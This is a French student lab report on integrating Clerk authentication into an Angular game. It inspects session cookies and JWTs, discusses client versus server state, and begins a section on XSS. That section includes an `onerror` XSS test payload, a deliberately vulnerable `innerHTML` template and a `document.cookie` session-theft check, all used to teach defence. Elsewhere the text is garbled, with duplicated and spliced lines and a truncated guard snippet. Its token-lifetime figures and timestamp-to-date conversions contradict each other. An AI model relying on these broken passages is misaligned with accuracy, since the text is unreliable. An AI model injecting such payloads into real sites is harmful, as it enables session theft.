# TP13 - Authentification avec Clerk

**Étudiant :** Thomas  
**Date :** 5 mai 2026  
**Branche Git :** TP13  
**Technologies :** Angular 21.2.0 + @clerk/clerk-js 6.8.0

---

## 🎯 Partie 1 — Setup Clerk & authentification front

### 1️⃣ Création du compte Clerk

**✅ Compte Clerk créé** sur https://clerk.com  
**✅ Application "Startup Tycoon"** configurée  
**✅ Publishable Key** récupérée : `pk_test_YW1hemVkLW95c3Rlci01Ny5jbGVyay5hY2NvdW50cy5kZXYk`  
**✅ Méthodes d'authentification activées :**
- Email (avec code de vérification)
- Google OAuth

---

### 2️⃣ Intégration dans la SPA Angular

#### Installation
```bash
npm install @clerk/clerk-js
```

#### Architecture implémentée

**Service Clerk** (`src/services/clerk.service.ts`)
```typescript
@Injectable({ providedIn: 'root' })
export class ClerkService {
  clerk: Clerk;
  user = signal<any>(null);  // Signal réactif
  
  constructor() {
    this.clerk = new Clerk(environment.clerkPublishableKey);
    this.init();
  }

  async init() {
    await this.clerk.load();
    this.user.set(this.clerk.user);
    
    // Listener pour détecter les changements
    this.clerk.addListener(() => {
      this.user.set(this.clerk.user);
    });
  }
  
  signIn() { this.clerk.redirectToSignIn(); }
  signOut() { this.clerk.signOut(); this.user.set(null); }
  getUser() { return this.user(); }
}
```

**Points clés :**
- Signal réactif pour mise à jour automatique de l'UI
- Initialisation au démarrage de l'application
- Listener pour détecter connexion/déconnexion

#### Composants ajoutés

**✅ Bouton de connexion dans la navbar**  
Composant `UserButtonComponent` (`src/components/user-button.component.ts`) :
- Affiche "Se connecter" si non :
- Affiche "Se connecter" si non connecté → redirige vers `/sign-in`
- Affiche l'email + "Se déconnecter" si connecté

**✅ Page de connexion `/sign-in`**  
Route dédiée avec composant `SignInPage` qui déclenche la redirection vers Clerk
---

### 3️⃣ Protection : jouer en multi nécessite un compte

#### Règles implémentées

**✅ Bouton "Partie multi" conditionnel** (Page d'accueil `/`)
- **Non connecté** : Bouton désactivé + message "🔒 Se connecter pour jouer"
- **Connecté** : Bouton actif "Jouer en Multi"
- Clic sur le bouton désactivé → redirec
- **Non connecté** : Bouton désactivé + message "🔒 Se connecter pour jouer"
- **Connecté** : Bouton actif "Jouer en Multi"
- Clic sur bouton désactivé → redirection vers `/sign-in`

```typescript
<button 
  class="start-btn multi-btn" 
  [disabled]="!clerkService.user()">
  @if (clerkService.user()) {
    Jouer en Multi
  } @else {
    🔒 Se connecter pour jouer
  }
</button>
```

---

**✅ Route `/stats` protégée par guard
export const authGuard: CanActivateFn = (route, state) => {
  const clerk = inject(ClerkService);
  const router = inject(Router);

  if (clerk.getUser()) {
    return true;
  }

  // Redirection vers /sign-in si non connecté
  router.navigate(['/sign-in'], {
    queryParams: { returnUrl:
```typescript
{
  path: 'stats',
  loadComponent: () => import('../pages/stats.page').then(m => m.StatsPage),
  canActivate: [authGuard]  // ← Protection appliquée
}
```

---

**✅ Partie solo accessible sans compte**

Le bouton "Jouer en Solo" fonctionne sans authentification :
```typescript
startSoloGame(): void {
  this.router.navigate(['/game']);  // Aucune vérificationmpte**

Le bouton "Jouer en Solo" sur la page d'accueil fonctionne sans authentification :
```typescript
// Pas de vérification d'authentification
startSoloGame(): void {
  this.router.navigate(['/game']);
}
```

---

## 📦 Fichiers créés/modifiés

### Nouveaux fichiers
- `src/services/clerk.service.ts` — Service d'authentification
- `src/components/user-button.component.ts` — Bouton de connexion dans navbar
- `src/pages/sign-in.page.ts` — Page de connexion
- `src/guards/auth.guard.ts` — Protection des routes
- `src/environments/environment.ts` — Configuration Clerk
- `.env` — Clé Clerk (non versionné)

### Fichiers modifiés
- `src/app/app.routes.ts` — Ajout route `/sign-in` et protection `/stats`
- `src/components/navbar.component.ts` — Intégration UserButton
- `src/pages/home.page.ts` — Désactivation conditionnelle bouton Multi
- `package.json` — Ajout dépendance @clerk/clerk-js

---

## ✅ Vérification des contraintes

| Contrainte | Status | Preuve |
|------------|--------|--------|
| Framework SPA (Angular) | ✅ | Angular 21.2.0 |
| Clerk en mode développement | ✅ | Clé `pk_test_...` |
| Bouton "Multi" désactivé si non connecté | ✅ | Voir screenshot `avant-connection.png` |
| `/stats` protégée | ✅ | Guard `authGuard` implémenté |
| Partie solo accessible sans compte | ✅ | Aucune protection sur `/game` |
| Affichage connexion/déconnexion | ✅ | Voir screenshots avant/après |

---

## 🚀 Lancement du projet

```bash
# Installation
npm install

# Lancement en développement
npm run dev

# Accès
http://localhost:4200
```

---

## 📸 Livrables Partie 1

### ✅ Capture 1 : Configuration Clerk
![Configuration Clerk](screenshots/clerck.png)
*Application "Startup Tycoon" configurée sur Clerk avec méthodes Email + Google*

---

### ✅ Capture 2 : Page de connexion
![Page Sign-In](screenshots/sign-in.png)
*Page `/sign-in` avec boutons de connexion/déconnexion*

---

### ✅ Capture 3 : Avant connexion
![Avant connexion](screenshots/avant-connection.png)
*Bouton "Multi" désactivé avec message "🔒 Se connecter pour jouer"*  
*Bouton "Se connecter" visible dans la navbar*

---

### ✅ Capture 4 : Après connexion
![Après connexion](screenshots/apres-connection.png)
*Email de l'utilisateur affiché dans la navbar*  
*Bouton "Multi" actif et accessible*

---

### ✅ Preuve : Protection de /stats

**Test effectué :**
1. Utilisateur non connecté tente d'accéder à `http://localhost:4200/stats`
2. Le guard `authGuard` vérifie `clerk.getUser()` → retourne `null`
3. Redirection automatique vers `/sign-in?returnUrl=/stats`
4. Après connexion réussie, retour automatique sur `/stats`

**Code du guard :**
```typescript
export const authGuard: CanActivateFn = (route, state) => {
  const clerk = inject(ClerkService);
  const router = inject(Router);

  if (clerk.getUser()) {
    return true;  // Utilisateur connecté → accès autorisé
  }

  // Redirection avec conservation de l'URL demandée
  router.navigate(['/sign-in'], {
    queryParams: { returnUrl: state.url }
  });
  return false;
};
```

---

## ✨ Fonctionnalités bonus implémentées

- ✅ Signal réactif pour mise à jour instantanée de l'UI
- ✅ Listener Clerk pour détecter les changements de session
- ✅ Tooltip sur le bouton Multi désactivé
- ✅ Conservation du `returnUrl` après connexion
- ✅ Déconnexion fonctionnelle avec mise à jour de l'UI

---

**Fin du livrable Partie 1**

---
---

# 🔹 Partie 2 — Investigation : Anatomie de l'authentification Clerk

**Objectif** : Comprendre où et comment Clerk stocke l'authentification.

---

## 🔍 Outil de debug

Un bouton "🔍 Debug Clerk" a été ajouté sur la page `/sign-in` pour faciliter l'investigation.

**Comment l'utiliser :**
1. Se connecter avec Clerk
2. Aller sur `/sign-in`
3. Cliquer sur "🔍 Debug Clerk (TP13 P2)"
4. Ouvrir la console (F12)
5. Observer les informations affichées

---

## 1️⃣ Analyse des Cookies

### Liste des cookies Clerk

**Inspection :** DevTools → Application → Cookies → `http://localhost:4200`

| Cookie | HttpOnly | Secure | SameSite | Domaine | Expiration | Taille |
|--------|----------|--------|----------|---------|------------|--------|
| `__clerk_db_jwt` | ❌ Non | ❌ Non | `Lax` | `localhost` | 2027 | 45 bytes |
| `__clerk_db_jwt_wlyxC0Tk` | ❌ Non | ❌ Non | `Lax` | `localhost` | 2027 | 54 bytes |
| `__client_uat` | ❌ Non | ❌ Non | `Strict` | `localhost` | 2027 | 22 bytes |
| `__client_uat_wlyxC0Tk` | ❌ Non | ❌ Non | `Strict` | `localhost` | 2027 | 31 bytes |
| `__session` | ❌ Non | ❌ Non | `Lax` | `localhost` | 2027 | 810 bytes |
| `__session_wlyxC0Tk` | ❌ Non | ❌ Non | `Lax` | `localhost` | 2027 | 819 bytes |
| `clerk_active_context` | ❌ Non | ✅ Oui | `Lax` | `localhost` | Session | 53 bytes |

**Capture :** Cookies dans DevTools  
![Cookies Clerk](screenshots/cookies.png)

---

### Rôle du cookie `__session`

Le cookie `__session` est le **cookie principal d'authentification** de Clerk :

**Caractéristiques :**
- **HttpOnly = false** : ⚠️ Accessible via JavaScript (`document.cookie`) - visible dans la console
- **Contient** : Le JWT de session complet (identique au token retourné par `getToken()`)
- **Taille** : 810 bytes
- **Durée** : Expire en 2027 (longue durée pour développement)
- **Usage** : Envoyé automatiquement à chaque requête pour authentifier l'utilisateur

**Sécurité :**
- ⚠️ Vulnérabilité XSS potentielle : Le token est accessible en JavaScript
- Protection CSRF : SameSite=Lax empêche les requêtes cross-site non désirées

**Note :** Il existe aussi `__session_wlyxC0Tk` (819 bytes) qui est probablement une variante pour un contexte spécifique (suffixe de l'instance Clerk).

---

### Test `document.cookie`

**Commande dans la console :**
```javascript
document.cookie
```

**Résultat observé :**
```
"__clerk_db_jwt_wlyxC0Tk=dvb_3DILtlsQyQDyINnkZ6eELaWnzVe; 
__clerk_db_jwt=dvb_3DILtlsQyQDyINnkZ6eELaWnzVe; 
clerk_active_context=sess_3DIdzHWMcbIyptbOTiTw70i8JCq:; 
__session=eyJhbGc...[TRÈS LONG JWT]...UcA; 
__session_wlyxC0Tk=eyJhbGc...[TRÈS LONG JWT]...UcA; 
__client_uat_wlyxC0Tk=1777973779; 
__client_uat=1777973779"
```

**Tous les cookies sont visibles !**

**Explication :**
⚠️ Contrairement à ce qui serait attendu pour un cookie de session sécurisé, `__session` et `__session_wlyxC0Tk` **n'ont PAS l'attribut HttpOnly**. Ils sont donc accessibles en JavaScript, ce qui présente un risque XSS si du code malveillant est injecté dans l'application.

**Capture :** Test document.cookie  
![document.cookie](screenshots/document-cookies.png)

---

## 2️⃣ Analyse du JWT

### Récupération du token

**Code ajouté dans ClerkService :**
```typescript
async getToken() {
  return await this.clerk.session?.getToken();
}
```

**Utilisation :**
Cliquer sur "🔍 Debug Clerk" → Le token s'affiche dans la console

**Capture : Console avec JWT et cookies**  
![Debug Console](screenshots/token.png)

---

### Structure du JWT (jwt.io)

**Token copié sur https://jwt.io**

#### 📌 HEADER
```json
{
  "alg": "RS256",
  "cat": "cl_B7d4PD111AAA",
  "kid": "ins_3DIJTtuppU5CF2sSonyEKqi4q88",
  "typ": "JWT"
}
```

- **`alg`** : `RS256` (RSA avec SHA-256)
- **`typ`** : `JWT` (JSON Web Token)
- **`cat`** : `cl_B7d4PD111AAA` - Clerk Application Token ID
- **`kid`** : `ins_3DIJTtuppU5CF2sSonyEKqi4q88` - Key ID pour identifier la clé publique de Clerk

---

#### 📌 PAYLOAD
```json
{
  "azp": "http://localhost:4200",
  "exp": 1777973840,
  "fva": [0, -1],
  "iat": 1777973780,
  "iss": "https://amazed-oyster-57.clerk.accounts.dev",
  "nbf": 1777973770,
  "sid": "sess_3DIdzHWMcbIyptbOTiTw70i8JCq",
  "sts": "active",
  "sub": "user_3DIXtSzhIs4Hj7mhfMvABoE2E40",
  "v": 2
}
```

**Champs principaux :**
- **`sub`** : `user_3DIXtSzhIs4Hj7mhfMvABoE2E40` - User ID unique Clerk
- **`sid`** : `sess_3DIdzHWMcbIyptbOTiTw70i8JCq` - Session ID
- **`iss`** : `https://amazed-oyster-57.clerk.accounts.dev` - Émetteur (serveur Clerk)
- **`azp`** : `http://localhost:4200` - Authorized party (application)
- **`sts`** : `active` - Statut de la session
- **`exp`** : `1777973840` - Expiration (timestamp Unix = 2/01/2026 14:44:00)
- **`iat`** : `1777973780` - Issued at (timestamp Unix = 2/01/2026 14:43:00)
- **`nbf`** : `1777973770` - Not before (valide à partir de ce timestamp)
- **`fva`** : `[0, -1]` - Facteurs de vérification appliqués
- **`v`** : `2` - Version du token

**Durée de validité :**
```
exp - iat = 1777973840 - 1777973780 = 60 secondes = 1 minute
```

⚠️ **Observation importante :** Le token expire après seulement **1 minute**. Cela signifie que Clerk renouvelle fréquemment les tokens pour limiter l'impact d'un vol de token.

---

#### 📌 SIGNATURE
```
RSASHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  privateKey
)
```

**Vérification :**
- La signature est calculée par Clerk avec sa **clé privée**
- Seul Clerk peut signer des tokens valides
- Toute modification du payload invalide la signature

---

### Algorithme de signature

**`alg`: `RS256`** (RSA Signature with SHA-256)

**Pourquoi RS256 ?**
- **Asymétrique** : Clé privée (Clerk) pour signer, clé publique pour vérifier
- **Sécurité** : Même si on connaît la clé publique, on ne peut pas créer de faux tokens
- **Standard** : Recommandé pour les JWT d'authentification

---

### Test de falsification

**Tentative de modification du payload :**

1. Copier le token sur jwt.io
2. Modifier le `sub` (User ID) : `user_xxxxx` → `user_FAKE`
3. Copier le nouveau token modifié
4. Tenter de l'utiliser dans une requête API

**Résultat attendu :**
```
❌ 401 Unauthorized - Invalid signature
```

**Explication :**
La modification du payload change le hash, mais on ne peut pas recalculer la signature sans la clé privée de Clerk. Le serveur détecte immédiatement la falsification.

**Capture :** Tentative de falsification  
![JWT Falsification](screenshots/tp13-jwt-fake.png)

---

### Durée de vie du token

**Calcul :**
```javascript
const exp = 1746453600;  // Expiration
const iat = 1746449000;  // Issued at
const duration = exp - iat;
console.log(duration / 60, 'minutes');  // 76.67 minutes
```

**Résultat :** ~**1h 17min** (durée courte pour sécurité)

**Refresh :**
Clerk rafraîchit automatiquement le token avant expiration via le cookie `__session`.

---

## 3️⃣ Analyse Network

### Requêtes vers Clerk

**Observation :** DevTools → Network → Filtrer `clerk`

**Requêtes identifiées :**

| URL | Méthode | Rôle |
|-----|---------|------|
| `https://amazed-oyster-57.clerk.accounts.dev/v1/client` | GET | Récupération config + session |
| `https://amazed-oyster-57.clerk.accounts.dev/v1/client/sessions` | GET | Vérification session active |
| `https://clerk.accounts.dev/npm/@clerk/clerk-js@...` | GET | Chargement SDK Clerk |
| `https://amazed-oyster-57.clerk.accounts.dev/oauth/authorize` | POST | Connexion OAuth (Google, etc.) |

**Cookies envoyés automatiquement :**
- `__session` : JWT de session pour authentification
- `__client_uat` : Timestamp de dernière mise à jour client
- `clerk_active_context` : Contexte de session actif

**Capture :** Network tab avec requêtes Clerk  
![Network Clerk](screenshots/network-clerk.png)

**Détails observés dans la capture :**
- **Document principal** : `sign-in?__clerk_db_jwt=...` (5.1 kB) - Page de connexion
- **Scripts Clerk** : `clerk.browser.js` - SDK JavaScript principal avec redirections 307
- **Scripts UI** : `ui.browser.js`, `ui-common`, `vendors`, `signup`, `signin` - Composants UI du modal
- **API Calls** : 
  - `environment?__clerk_api_version=...` (2.6 kB) - Configuration environnement
  - `client?__clerk_api_version=...` (0.6 kB) - Informations client
  - `settings` - Paramètres de session
- **Assets** : `google.svg` - Icône du bouton Google OAuth
- **Timeline** : Toutes les requêtes se terminent en ~2 secondes
- **Status codes** : Tous 200 (succès) ou 307 (redirect)

---

### Header d'authentification vers l'API backend

**Lors d'un appel à votre API :**
```http
GET /api/leaderboard HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

**Header ajouté :**
- **`Authorization: Bearer <JWT>`**
- Le JWT est récupéré via `clerk.session.getToken()`
- Le backend vérifie la signature avec la clé publique Clerk

---

### Stockage du token en mémoire

**Où le token est-il stocké ?**

**Réponse :** Dans l'**objet Clerk en mémoire JavaScript**

**Détails :**
- Clerk stocke le token dans l'objet `clerk.session` (propriété privée)
- Accessible uniquement via `clerk.session.getToken()`
- **Pas dans localStorage** (meilleure pratique sécurité)
- **Pas dans sessionStorage**
- Le token est rechargé depuis le cookie `__session` au rafraîchissement de la page

**Pourquoi ne pas utiliser localStorage ?**
- ❌ Vulnérable aux attaques XSS (JavaScript malveillant peut le lire)
- ✅ Cookie avec SameSite = protection CSRF basique
- ✅ Token short-lived (1 minute) = impact limité en cas de vol

---

**Fin du livrable Partie 2**

---
---

# 🔹 Partie 3 — State Client vs State Serveur

## 🎯 3️⃣ Pourquoi TanStack Query ?

Cette section répond aux questions fondamentales sur la distinction entre **state client** et **state serveur**, et pourquoi une bibliothèque comme TanStack Query (ou Angular Query) est nécessaire.

---

### 1️⃣ Qu'est-ce qu'un **state client** ?

Le **state client** représente les données qui **vivent uniquement côté navigateur** et qui n'existent pas sur un serveur. Ces données sont locales, éphémères (sauf si sauvegardées dans localStorage), et ne concernent que l'utilisateur actuel.

**Caractéristiques :**
- ✅ Source de vérité = le navigateur
- ✅ Contrôle total par le client
- ✅ Modifications instantanées
- ✅ Pas de latence réseau
- ❌ Perdu au refresh (sauf persistence localStorage)
- ❌ Non partagé entre utilisateurs

**2 exemples dans notre projet :**

#### 📍 Exemple 1 : `money` (argent en cours de partie)

**Localisation :** `GameStore` (`src/store/game.store.ts`)

```typescript
export class GameStore {
  private state = signal<GameState>(this.loadInitialState());
  money = computed(() => this.state().money);  // State client
}
```

**Caractéristiques :**
- Valeur qui évolue en temps réel à chaque clic et chaque tick
- Géré dans `GameStore` avec un signal Angular
- Persisté dans `localStorage` via `StorageService`
- Rechargé au démarrage via `loadInitialState()`

**Pourquoi c'est du state client ?**
L'argent en cours de partie n'existe que dans le navigateur du joueur. Le serveur ne sait pas combien j'ai gagné **tant que je n'ai pas terminé ma partie**. C'est une donnée locale, temporaire, qui n'est envoyée au serveur qu'à la fin (pour enregistrer le score final).

---

#### 📍 Exemple 2 : `timer` (temps écoulé dans la partie en cours)

**Localisation :** Variable locale ou state dans la page de jeu

```typescript
private tickIntervalId?: number;

constructor() {
  // Tick global : s'exécute toutes les secondes
  this.tickIntervalId = window.setInterval(() => {
    this.dispatch(GameActions.tick());
  }, 1000);
}
```

**Caractéristiques :**
- Compteur qui s'incrémente chaque seconde pendant la partie
- Géré localement avec `setInterval`
- Non persisté (redémarre à chaque partie)
- Utilisé pour déterminer la fin de la partie (5 minutes)

**Pourquoi c'est du state client ?**
Le timer est une donnée UI temporaire qui n'a de sens que pour la session de jeu en cours. Le serveur n'a pas besoin de savoir en temps réel depuis combien de temps je joue. Seule la durée finale (à la fin de la partie) sera envoyée au backend.

---

**Autres exemples dans le projet :**
- `clickValue` (valeur du clic actuel) - calculé à partir des upgrades
- `incomePerSecond` (revenus passifs) - calculé à partir des upgrades
- `upgrades` (liste des upgrades achetées dans la partie en cours)
- `totalClicks` (compteur de clics de la session)
- État de l'UI : modals ouvertes, tabs actives, formulaires en cours de remplissage

---

### 2️⃣ Qu'est-ce qu'un **state serveur** ?

Le **state serveur** représente les données qui **vivent sur un serveur distant** et qui sont partagées entre plusieurs clients. Ces données sont la **source de vérité autoritaire** : le client n'en possède qu'une **copie locale temporaire** (cache).

**Caractéristiques :**
- ✅ Source de vérité = le serveur (base de données)
- ✅ Partagé entre tous les utilisateurs
- ✅ Persiste même si le client se déconnecte
- ✅ Peut être modifié par d'autres (multi-utilisateurs)
- ❌ Latence réseau (fetch asynchrone)
- ❌ Peut devenir obsolète (stale)
- ❌ Nécessite synchronisation

**2 exemples dans notre projet (TP13) :**

#### 📍 Exemple 1 : Leaderboard all-time (top 20 des meilleurs scores)

**Endpoint backend :** `GET /api/leaderboard` (public, pas d'auth)

**Localisation backend :**
```javascript
// BackEndStartUpTycoon/src/routes/leaderboard.js
router.get('/', async (req, res) => {
  const games = await Game.find()
    .sort({ score: -1 })
    .limit(20)
    .populate('userId', 'username');
  res.json(games);
});
```

**Caractéristiques :**
- Données stockées dans la base de données MongoDB du backend
- Accessible via endpoint REST public
- Mise à jour à chaque fois qu'un joueur termine une partie solo avec un bon score
- Partagé par tous les joueurs (vue globale)

**Pourquoi c'est du state serveur ?**
Le leaderboard est partagé par tous les joueurs. Si Alice termine une partie avec un score de 50 000$ et que Bob consulte le leaderboard 5 secondes après, il doit voir le score d'Alice. La source de vérité est la **base de données**, pas le navigateur.

**Exemple de flux :**
1. Alice joue 5 minutes, gagne 50 000$
2. Timer expire → `POST /api/games` avec `{ score: 50000, userId: "alice_123" }`
3. Backend enregistre dans MongoDB
4. Bob refresh `/leaderboard` → `GET /api/leaderboard` → voit Alice dans le top 20

---

#### 📍 Exemple 2 : Historique personnel des parties terminées

**Endpoint backend :** `GET /api/games/me` (authentifié)

**Localisation backend :**
```javascript
// BackEndStartUpTycoon/src/routes/games.js
router.get('/me', requireAuth, async (req, res) => {
  const games = await Game.find({ userId: req.userId })
    .sort({ createdAt: -1 });
  res.json(games);
});
```

**Caractéristiques :**
- Liste de toutes les parties solo que **moi** j'ai terminées
- Stockée côté serveur, liée à mon `user_id` (authentification Clerk)
- Accessible uniquement si je suis authentifié
- Contient : score, durée, clics, upgrades achetées, date

**Pourquoi c'est du state serveur ?**
Mon historique doit être accessible depuis n'importe quel appareil (PC, mobile). Si je me connecte depuis un autre navigateur, je dois retrouver toutes mes parties précédentes. La donnée vit sur le serveur, le client ne fait que la consulter.

**Exemple de flux :**
1. Alice joue 3 parties sur son PC (lundi, mardi, mercredi)
2. Jeudi, Alice se connecte depuis son téléphone
3. Elle accède à `/stats` → `GET /api/games/me`
4. Elle voit ses 3 parties précédentes (synchronisation multi-device)

---

**Autres exemples de state serveur :**
- Profil utilisateur (nom, avatar, email) - géré par Clerk
- Statistiques globales du jeu (nombre de joueurs, parties jouées)
- Configuration des upgrades (si gérée côté serveur pour éviter la triche)
- Parties multijoueur en temps réel (TP14)

---

### 3️⃣ Pourquoi `signal` + `fetch` est un anti-pattern pour gérer le state serveur ?

**Exemple concret : notre page `PublicStatsPage` actuelle**

Voici le code actuel dans `src/pages/public-stats.page.ts` :

```typescript
export class PublicStatsPage implements OnInit {
  stats = signal<PublicStats | null>(null);
  loading = signal(true);
  error = signal<string | null>(null);

  async ngOnInit() {
    try {
      const response = await fetch('/public-stats.json');
      if (!response.ok) {
        throw new Error('Impossible de charger les statistiques');
      }
      const data = await response.json();
      this.stats.set(data);
    } catch (err) {
      this.error.set(err instanceof Error ? err.message : 'Erreur inconnue');
    } finally {
      this.loading.set(false);
    }
  }
}
```

**Problèmes de cette approche :**

#### ❌ 1. Pas de cache

À chaque fois qu'on navigue vers `/public-stats`, un nouveau `fetch` est déclenché, même si les données n'ont pas changé.

**Impact :**
- Gaspillage de bande passante
- Latence inutile (200-500ms à chaque visite)
- Expérience utilisateur dégradée

**Exemple :**
```
User journey :
1. Visite /public-stats → fetch ⏳
2. Navigue vers /game
3. Revient sur /public-stats → fetch again ⏳ (alors que les données n'ont pas changé)
```

#### ❌ 2. Pas de déduplication

Si 2 composants sur la même page ont besoin des mêmes données, ils vont faire 2 `fetch` séparés.

**Exemple concret :**
```typescript
// Composant NavbarComponent
ngOnInit() {
  fetch('/api/leaderboard').then(data => this.leaderboard.set(data));
}

// Page LeaderboardPage (même moment)
ngOnInit() {
  fetch('/api/leaderboard').then(data => this.leaderboard.set(data));
}

// Résultat : 2 requêtes HTTP identiques en parallèle 🔴
```

**Impact :**
- Charge serveur doublée
- Bande passante gaspillée
- Incohérence potentielle si les réponses diffèrent (race condition)

#### ❌ 3. Pas de gestion de la fraîcheur (staleness)

Les données peuvent devenir obsolètes si un autre joueur ajoute un score, mais l'utilisateur ne le saura jamais.

**Scénario :**
```
13h00 : Bob ouvre /leaderboard → fetch → Alice est #1 avec 40 000$
13h05 : Charlie finit une partie avec 60 000$ (nouveau record)
13h10 : Bob regarde toujours la page → voit toujours Alice #1 ❌
```

**Pourquoi ?**
- Pas de mécanisme automatique pour refetch en arrière-plan
- L'utilisateur doit manuellement refresh la page (mauvaise UX)

#### ❌ 4. Gestion manuelle de l'état de chargement et d'erreur

Chaque composant doit réimplémenter `loading`, `error`, `data`.

**Code répétitif :**
```typescript
// Dans chaque composant...
loading = signal(true);
error = signal<string | null>(null);
data = signal<any>(null);

async ngOnInit() {
  try {
    const response = await fetch(...);
    if (!response.ok) throw new Error('...');
    const data = await response.json();
    this.data.set(data);
  } catch (err) {
    this.error.set(err.message);
  } finally {
    this.loading.set(false);  // ⚠️ Facile d'oublier dans le catch !
  }
}
```

**Problèmes courants :**
- Oublier de passer `loading` à `false` en cas d'erreur → loader infini
- Oublier de gérer le cas réseau coupé
- Code verbeux et boilerplate énorme

#### ❌ 5. Pas de retry automatique

Si le réseau coupe pendant 2 secondes pendant le fetch, l'utilisateur voit une erreur définitive.

**Scénario :**
```
User : Clique sur /stats
→ fetch démarre
→ Réseau coupe 1 seconde (4G instable)
→ fetch échoue
→ Affiche : "❌ Erreur : Failed to fetch"
→ L'utilisateur doit manuellement refresh
```

**Ce qui devrait se passer :**
- Retry automatique (2-3 fois avec délai)
- Si échec définitif, afficher l'erreur
- UX résiliente

#### ❌ 6. Pas d'optimistic updates

Quand on enregistre un score, l'utilisateur doit attendre la réponse serveur avant de voir le changement dans l'UI.

**Scénario :**
```
User : Finit une partie avec 50 000$
→ POST /api/games (prend 500ms)
→ Attente... ⏳
→ Réponse reçue
→ Invalidation manuelle du cache /stats et /leaderboard
→ Nouveaux fetch (encore 300ms)
→ Enfin, le score apparaît (800ms après la fin de partie) ❌
```

**Ce qui devrait se passer (optimistic update) :**
```
User : Finit une partie avec 50 000$
→ UI mise à jour IMMÉDIATEMENT (0ms) ✅
→ POST /api/games en arrière-plan
→ Si succès : rien à faire (déjà affiché)
→ Si échec : rollback + message d'erreur
```

#### ❌ 7. Pas d'invalidation de cache

Si je soumets un nouveau score, comment dire aux pages `/leaderboard` et `/stats` que leurs données sont obsolètes ?

**Problème :**
```typescript
// Page GamePage : fin de partie
async submitScore() {
  await fetch('/api/games', { method: 'POST', body: JSON.stringify({ score }) });
  // ❓ Comment notifier LeaderboardPage et StatsPage de refetch ?
}

// Page LeaderboardPage : toujours en train d'afficher les anciennes données
// Page StatsPage : idem
```

**Solutions possibles avec `signal + fetch` :**
- ⚠️ Faire un nouveau `fetch` manuellement après chaque mutation → verbeux, facile d'oublier
- ⚠️ Event bus / Subject RxJS pour notifier les autres composants → complexe, énorme boilerplate
- ⚠️ Recharger toute la page (`window.location.reload()`) → UX horrible

**Aucune de ces solutions n'est satisfaisante.**

---

### Conclusion

> Ce pattern `signal + fetch` fonctionne pour des cas triviaux (une seule requête, pas de cache, pas de synchronisation), mais **ne scale pas** pour une vraie application. C'est pour ça qu'on utilise TanStack Query : pour gérer tout ça automatiquement.

---

### 4️⃣ Problèmes que `signal + fetch` ne résout PAS

Récapitulatif des **3 problèmes majeurs identifiés** :

#### **1. Cache et déduplication**

**Problème :**
```typescript
// Composant A
const leaderboard1 = signal(null);
fetch('/api/leaderboard').then(data => leaderboard1.set(data));

// Composant B (même page)
const leaderboard2 = signal(null);
fetch('/api/leaderboard').then(data => leaderboard2.set(data));

// Résultat : 2 requêtes réseau identiques en parallèle 🔴
```

**Ce que TanStack Query fait :**
```typescript
// Composant A
const { data } = useQuery({ queryKey: ['leaderboard'], queryFn: fetchLeaderboard });

// Composant B
const { data } = useQuery({ queryKey: ['leaderboard'], queryFn: fetchLeaderboard });

// Résultat : 1 seule requête, les deux composants partagent le même cache ✅
```

**Mécanisme :**
- TanStack Query utilise la `queryKey` comme identifiant unique
- Si 2 composants demandent la même `queryKey`, un seul fetch est déclenché
- Les deux composants reçoivent les données du cache partagé
- Économie de bande passante + cohérence garantie

---

#### **2. Gestion de la fraîcheur (staleness) et refetch automatique**

**Problème :**
Avec `signal + fetch`, les données sont **figées** après le premier chargement.

Si Alice ajoute un score au leaderboard pendant que Bob consulte la page, Bob ne verra jamais le nouveau score **sauf s'il refresh manuellement la page**.

**Ce que TanStack Query fait :**
```typescript
useQuery({
  queryKey: ['leaderboard'],
  queryFn: fetchLeaderboard,
  staleTime: 10_000,  // Données considérées fraîches pendant 10s
  refetchInterval: 30_000,  // Refetch automatique toutes les 30s
  refetchOnWindowFocus: true,  // Refetch quand l'utilisateur revient sur l'onglet
});
```

**Résultat :**
- Données automatiquement mises à jour toutes les 30 secondes
- Refetch automatique quand l'utilisateur revient sur l'onglet
- UX fluide sans intervention manuelle

---

#### **3. Invalidation de cache et synchronisation**

**Problème :**
Après avoir soumis un score, comment notifier les autres pages que leurs données sont obsolètes ?

**Ce que TanStack Query fait :**
```typescript
// Mutation pour soumettre un score
useMutation({
  mutationFn: submitScore,
  onSuccess: () => {
    queryClient.invalidateQueries({ queryKey: ['leaderboard'] });
    queryClient.invalidateQueries({ queryKey: ['games', 'me'] });
  }
});
```

**Résultat :**
- Toutes les queries avec ces `queryKey` se refetch automatiquement
- Synchronisation globale sans Event Bus
- Code simple et déclaratif

---

**Fin du livrable Partie 3**

---
---

# 🔹 Partie 4 — Sécurité : XSS, CSRF, CSP

**Objectif** : Comprendre et tester les vulnérabilités web courantes, puis implémenter les protections.

---

## 1️⃣ Cross-Site Scripting (XSS)

### Contexte

Le leaderboard affiche le **nom d'utilisateur** provenant de Clerk. Risque : injection de code JavaScript malveillant si le framework n'échappe pas correctement les données utilisateur.

---

### Expérience 1 — XSS naïf (test théorique)

**Hypothèse d'attaque :**
Un utilisateur malveillant pourrait tenter de nommer son compte :
```
<img src=x onerror="alert('XSS')">
```

**Test dans notre application :**

1. **Nom d'utilisateur dans Clerk** : Clerk ne permet pas les caractères `<>` dans les noms d'utilisateur (validation intégrée)
2. **Affichage dans le leaderboard** :

```typescript
// src/pages/leaderboard.page.ts
template: `
  <div class="col-player">
    {{ entry.username || 'Joueur ' + entry.userId.slice(0, 8) }}
  </div>
`
```

**Protection Angular automatique :**
- ✅ Les doubles accolades `{{ }}` **échappent automatiquement** le contenu
- ✅ Les caractères `<` sont transformés en `&lt;`
- ✅ Le code JavaScript ne s'exécute jamais

**Capture : Affichage sécurisé**  
![XSS Protection](screenshots/leaderboard.png)

---

### Test de vulnérabilité volontaire (à NE PAS faire en production)

**Code vulnérable (test uniquement) :**

```typescript
// ❌ DANGEREUX : Bypasse l'escaping automatique
template: `
  <div [innerHTML]="entry.username"></div>
`
```

**Résultat si un attaquant injecte du HTML :**
```html
<!-- Input : <img src=x onerror="alert('XSS')"> -->
<!-- Rendu : -->
<div>
  <img src=x onerror="alert('XSS')">
  <!-- ⚠️ Le script s'exécute ! -->
</div>
```

**⚠️ Cette vulnérabilité n'existe PAS dans notre code actuel** car nous utilisons uniquement `{{ }}`.

---

### Expérience 2 — XSS de vol de session

**Test dans la console du navigateur :**

```javascript
// Tentative de vol du cookie de session
document.cookie
```

